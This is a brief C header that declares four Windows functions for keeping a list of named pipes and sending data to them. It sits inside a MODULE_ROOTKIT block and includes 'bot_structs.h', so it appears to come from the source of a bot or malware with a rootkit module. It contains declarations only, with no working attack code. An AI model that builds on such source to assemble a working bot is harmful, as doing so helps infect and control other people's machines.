#pragma once
#include "modules.h"

#ifdef MODULE_ROOTKIT
#include "bot_structs.h"

void WINAPI AddPipeToList(HANDLE hPipe);
void WINAPI RemovePipeFromList(HANDLE hPipe);
BOOL WINAPI SendDataToPipe(HANDLE hPipe, const LPSTR pszData);
void WINAPI SendToAllPipes(const LPSTR pszData);
#endif